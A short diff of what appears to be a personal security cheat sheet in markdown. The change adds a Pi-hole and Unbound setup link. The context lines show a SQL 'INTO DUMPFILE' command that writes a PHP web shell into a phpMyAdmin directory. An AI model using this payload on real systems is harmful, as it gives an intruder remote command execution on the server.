@@ -320,6 +320,10 @@ If you need to generate a nice html report from the output you can use *_xsltpro
 
 * `select ("<?php system($_REQUEST['cmd'])?>") INTO DUMPFILE C:\\wamp\\apps\\phpmyadmin5.0.2\\cmd.php`
 
+## Pihole ( and Unbound)
+
+* For easy install and setup follow the steps in this blog post at **[Crosstalk Soutions](https://www.crosstalksolutions.com/the-worlds-greatest-pi-hole-and-unbound-tutorial-2023/)**
+
 ## playing with encoding and hashes
 If you are interested in more depth on this matter check out the cyberchef's website.
 
